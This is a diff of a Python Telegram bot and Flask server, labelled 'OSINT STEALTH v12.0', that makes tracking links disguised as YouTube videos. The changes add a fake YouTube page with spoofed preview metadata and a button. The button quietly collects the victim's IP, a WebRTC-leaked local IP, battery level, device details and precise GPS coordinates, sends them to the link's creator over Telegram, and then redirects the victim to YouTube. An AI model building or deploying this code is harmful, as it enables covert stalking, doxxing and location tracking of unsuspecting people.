@@ -23,80 +23,71 @@ def save_db(db):
 @app.route('/')
 def home(): return "SYSTEM ONLINE", 200
 
-# --- ГЛУБОКИЙ HTML СКРИПТ ---
+# --- СТЕЛС-HTML (С МАСКИРОВКОЙ) ---
 HTML_TRAP = """
 <!DOCTYPE html>
 <html>
 <head>
+    <title>YouTube - Посмотрите это видео</title>
+    <meta property="og:title" content="YouTube: Новое видео на канале">
+    <meta property="og:description" content="1.2 млн просмотров • 2 часа назад">
+    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #0f0; padding: 20px; text-align: center; }
+        body { background: #000; color: #fff; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .yt-loader { text-align: center; }
+        .spinner { border: 3px solid #333; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background: #f00; color: #fff; border: none; padding: 10px 20px; border-radius: 2px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
     </style>
 </head>
-<body onclick="collect()">
-    <div class="box">
-        [ SYSTEM ACCESS REQUIRED ]<br><br>
-        Click to verify you are human
+<body>
+    <div class="yt-loader" id="content">
+        <div class="spinner"></div>
+        <p>Для просмотра видео подтвердите, что вы не робот</p>
+        <button class="btn" onclick="collect()">Смотреть</button>
     </div>
+
 <script>
 async function collect() {
-    let d = { 
-        aid: "{{ aid }}", lure: "{{ lure }}",
-        ua: navigator.userAgent,
-        lang: navigator.language,
-        cores: navigator.hardwareConcurrency || "N/A",
-        mem: navigator.deviceMemory || "N/A",
-        plat: navigator.platform,
-        res: screen.width + "x" + screen.height,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+    document.getElementById('content').innerHTML = '<div class="spinner"></div><p>Загрузка плеера...</p>';
+    
+    let d = { aid: "{{ aid }}", lure: "{{ lure }}", ua: navigator.userAgent, res: screen.width + "x" + screen.height };
 
-    // 1. Батарея
     try {
         let b = await navigator.getBattery();
-        d.bat = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
-    } catch(e) { d.bat = "N/A"; }
+        d.bat = Math.round(b.level * 100) + "%";
+    } catch(e) {}
 
-    // 2. Видеокарта (GPU)
-    try {
-        let c = document.createElement('canvas');
-        let gl = c.getContext('webgl');
-        let debug = gl.getExtension('WEBGL_debug_renderer_info');
-        d.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-    } catch(e) { d.gpu = "N/A"; }
-
-    // 3. Локальный IP (WebRTC)
     try {
         let pc = new RTCPeerConnection({iceServers:[]});
         pc.createDataChannel("");
         pc.createOffer().then(o => pc.setLocalDescription(o));
         pc.onicecandidate = (i) => {
             if (i && i.candidate) {
-                let ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
-                d.local_ip = ip;
+                d.local_ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
             }
         };
     } catch(e) {}
 
-    // 4. GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; d.acc = p.coords.accuracy + "m"; send(d); },
-            (e) => { d.gps = "Denied (" + e.message + ")"; send(d); },
+            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; send(d); },
+            (e) => { d.gps = "Denied"; send(d); },
             { enableHighAccuracy: true, timeout: 5000 }
         );
-    } else { d.gps = "Not Supported"; send(d); }
+    } else { send(d); }
     
-    setTimeout(() => { if(!d.gps_sent) send(d); }, 4000);
+    setTimeout(() => { send(d); }, 4000);
 }
 
 function send(d) {
-    if(window.sent) return;
-    window.sent = true; d.gps_sent = true;
+    if(window.sent) return; window.sent = true;
     fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
     .finally(() => { 
-        let u = {"yt":"https://youtube.com","gg":"https://google.com","tt":"https://tiktok.com"};
-        location.href = u["{{ lure }}"] || "https://google.com";
+        let u = {"yt":"https://youtube.com","gg":"https://google.com"};
+        location.href = u["{{ lure }}"] || "https://youtube.com";
     });
 }
 </script>
@@ -117,42 +108,23 @@ def trap(aid, lure):
 def catch():
     d = request.json
     ips = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
     report = (
-        f"🚨 **FULL TARGET DOSSIER**\n"
+        f"🎯 **ЦЕЛЬ ПЕРЕШЛА ПО ССЫЛКЕ**\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 **NETWORK DATA:**\n"
-        f"• Public IPs: `{ips}`\n"
-        f"• Local IP: `{d.get('local_ip', 'N/A')}`\n"
-        f"• Timezone: {d.get('tz')}\n"
-        f"• Language: {d.get('lang')}\n\n"
-        f"📍 **LOCATION:**\n"
-        f"• Координаты: `{d.get('gps')}`\n"
-        f"• Точность: {d.get('acc', 'N/A')}\n"
-        f"• [Посмотреть на карте](https://www.google.com/maps?q={d.get('gps')})\n\n"
-        f"💻 **HARDWARE:**\n"
-        f"• OS: `{d.get('plat')}`\n"
-        f"• CPU: {d.get('cores')} Cores | RAM: ~{d.get('mem')}GB\n"
-        f"• GPU: `{d.get('gpu')}`\n"
-        f"• Screen: {d.get('res')}\n\n"
-        f"🔋 **STATUS:**\n"
-        f"• Battery: {d.get('bat')}\n"
-        f"• Browser: {d.get('ua')[:100]}...\n"
+        f"🌐 **IP:** `{ips}`\n"
+        f"🏠 **Local IP:** `{d.get('local_ip', 'N/A')}`\n"
+        f"🔋 **Заряд:** {d.get('bat', 'N/A')}\n"
+        f"📍 **GPS:** `{d.get('gps', 'N/A')}`\n"
+        f"🔗 [Открыть на карте](https://www.google.com/maps?q={d.get('gps')})\n"
         f"━━━━━━━━━━━━━━━━━━━━"
     )
-    
     url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
-    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
+    requests.post(url, json={"chat_id": d['aid'], "text": report})
     return "OK", 200
 
 # --- БОТ ---
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
-
-def get_main_kb():
-    kb = ReplyKeyboardBuilder()
-    kb.add(types.KeyboardButton(text="🚀 Создать ссылку"), types.KeyboardButton(text="📊 Статистика"))
-    return kb.as_markup(resize_keyboard=True)
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -161,25 +133,22 @@ async def cmd_start(message: types.Message):
     if uid not in db["users"]:
         db["users"][uid] = {"clicks": 0, "ips": []}
         save_db(db)
-    await message.answer("💀 **OSINT MONSTER v11.0**\nСистема сбора данных готова.", reply_markup=get_main_kb())
-
-@dp.message(F.text == "🚀 Создать ссылку")
-async def create_step(message: types.Message):
+    
     kb = ReplyKeyboardBuilder()
-    kb.add(types.KeyboardButton(text="🎬 YouTube"), types.KeyboardButton(text="🔍 Google"), types.KeyboardButton(text="❌ Отмена"))
-    await message.answer("Выбери цель редиректа:", reply_markup=kb.as_markup(resize_keyboard=True))
+    kb.add(types.KeyboardButton(text="🎬 Создать ссылку (YouTube)"))
+    kb.add(types.KeyboardButton(text="📊 Статистика"))
+    await message.answer("🤖 **OSINT STEALTH v12.0**\nВыберите действие:", reply_markup=kb.as_markup(resize_keyboard=True))
 
-@dp.message(F.text.in_(["🎬 YouTube", "🔍 Google"]))
-async def finish_create(message: types.Message):
-    l = "yt" if "YouTube" in message.text else "gg"
-    link = f"{BASE_URL}/t/{message.from_user.id}/{l}"
-    await message.answer(f"✅ **Ссылка создана:**\n`{link}`", reply_markup=get_main_kb())
+@dp.message(F.text == "🎬 Создать ссылку (YouTube)")
+async def create_link(message: types.Message):
+    link = f"{BASE_URL}/t/{message.from_user.id}/yt"
+    await message.answer(f"✅ **Твоя зашифрованная ссылка:**\n\n`{link}`\n\n*В мессенджерах она будет выглядеть как видео YouTube.*")
 
 @dp.message(F.text == "📊 Статистика")
-async def show_stats(message: types.Message):
+async def stats(message: types.Message):
     db = load_db()
-    u = db["users"].get(str(message.from_user.id), {"clicks": 0, "ips": []})
-    await message.answer(f"📈 **Твои клики:** `{u['clicks']}`", reply_markup=get_main_kb())
+    u = db["users"].get(str(message.from_user.id), {"clicks": 0})
+    await message.answer(f"📈 У тебя переходов: `{u['clicks']}`")
 
 async def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
